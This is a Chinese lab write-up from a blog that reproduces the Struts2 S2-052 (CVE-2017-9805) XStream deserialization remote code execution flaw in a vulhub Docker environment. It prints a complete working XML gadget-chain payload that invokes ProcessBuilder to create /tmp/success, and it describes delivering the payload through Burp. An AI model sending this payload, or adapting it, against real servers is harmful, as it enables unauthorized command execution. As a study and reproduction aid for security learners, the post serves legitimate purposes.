# CVE-2017-9805 S2-052 复现 - 美式加糖 - 博客园

> 原文：[`www.cnblogs.com/peace-and-romance/p/15652523.html`](https://www.cnblogs.com/peace-and-romance/p/15652523.html)

### 0X00-引言

* * *

吉吉吉吉呗呗，吉吉吉吉呗呗

### 0X01-环境搭建

* * *

靶机：CentOS Linux 7

攻击机：windows server 2016 && Kail

环境：vulhub

工具：burpsuite

项目地址：[`github.com/vulhub/vulhub`](https://github.com/vulhub/vulhub)

搭建 vulhub 请访问：[空白 centos7 64 搭建 vulhub(详细)](https://www.cnblogs.com/peace-and-romance/p/15621658.html)

### 0X02-漏洞描述

* * *

Struts2-Rest-Plugin 是让 Struts2 能够实现 Restful API 的一个插件，其根据 Content-Type 或 URI 扩展名来判断用户传入的数据包类型，有如下映射表：

| 扩展名 | Content-Type | 解析方法 |
| --- | --- | --- |
| xml | application/xml | xstream |
| json | application/json | jsonlib 或 jackson(可选) |
| xhtml | application/xhtml+xml | 无 |
| 无 | application/x-www-form-urlencoded | 无 |
| 无 | multipart/form-data | 无 |

jsonlib 无法引入任意对象，而 xstream 在默认情况下是可以引入任意对象的（针对 1.5.x 以前的版本），方法就是直接通过 xml 的 tag name 指定需要实例化的类名：

```
<classname></classname>
//或者
<paramname class="classname"></paramname> 
```

所以，我们可以通过反序列化引入任意类造成远程命令执行漏洞，只需要找到一个在 Struts2 库中适用的 gedget。

影响版本: Struts 2.1.2 - Struts 2.3.33, Struts 2.5 - Struts 2.5.12

### 0X03-漏洞复现

* * *

启动环境后，访问`http://your-ip:8080/orders.xhtml`即可看到 showcase 页面。由于 rest-plugin 会根据 URI 扩展名或 Content-Type 来判断解析方法，所以我们只需要修改 orders.xhtml 为 orders.xml 或修改 Content-Type 头为 application/xml，即可在 Body 中传递 XML 数据。

`http://192.168.234.128:8080/orders`

![image-20211206162356937](img/6167b56e21ad578c2a9e58095c0e668b.png)

##### 01-创建/tmp/success

POC：

```
<map>
  <entry>
    <jdk.nashorn.internal.objects.NativeString>
      <flags>0</flags>
      <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
        <dataHandler>
          <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
            <is class="javax.crypto.CipherInputStream">
              <cipher class="javax.crypto.NullCipher">
                <initialized>false</initialized>
                <opmode>0</opmode>
                <serviceIterator class="javax.imageio.spi.FilterIterator">
                  <iter class="javax.imageio.spi.FilterIterator">
                    <iter class="java.util.Collections$EmptyIterator"/>
                    <next class="java.lang.ProcessBuilder">
                      <command>
                        <string>touch</string>
                        <string>/tmp/success</string>
                      </command>
                      <redirectErrorStream>false</redirectErrorStream>
                    </next>
                  </iter>
                  <filter class="javax.imageio.ImageIO$ContainsFilter">
                    <method>
                      <class>java.lang.ProcessBuilder</class>
                      <name>start</name>
                      <parameter-types/>
                    </method>
                    <name>foo</name>
                  </filter>
                  <next class="string">foo</next>
                </serviceIterator>
                <lock/>
              </cipher>
              <input class="java.lang.ProcessBuilder$NullInputStream"/>
              <ibuffer></ibuffer>
              <done>false</done>
              <ostart>0</ostart>
              <ofinish>0</ofinish>
              <closed>false</closed>
            </is>
            <consumed>false</consumed>
          </dataSource>
          <transferFlavors/>
        </dataHandler>
        <dataLen>0</dataLen>
      </value>
    </jdk.nashorn.internal.objects.NativeString>
    <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
  </entry>
  <entry>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
  </entry>
</map> 
```

点击 edit，进入页面，burp 抓包-发送到 repeater

![image-20211206163003253](img/4cb2141b5887bbadd21eb80335fe1055.png)

![image-20211206163146263](img/5bbc8ebe549c6eba0be14c6a5efcbed6.png)

修改-发送-回显 500，但是成功

![image-20211206163317173](img/ca881b96abf4c0c3a5f36f72530de146.png)

进入 docker 查看-成功

`docker-compose exec struts2 ls /tmp/`

![image-20211206163418285](img/7a6f120a3a26b9bd5f6eb62957d551ba.png)

### 0X04-漏洞分析

* * *

略

### 0X05-参考

* * *

[S2-052 远程代码执行漏洞](https://github.com/vulhub/vulhub/blob/master/struts2/s2-052/README.zh-cn.md)

[Apache Struts2--052 远程代码执行漏洞复现](https://www.freebuf.com/vuls/252136.html)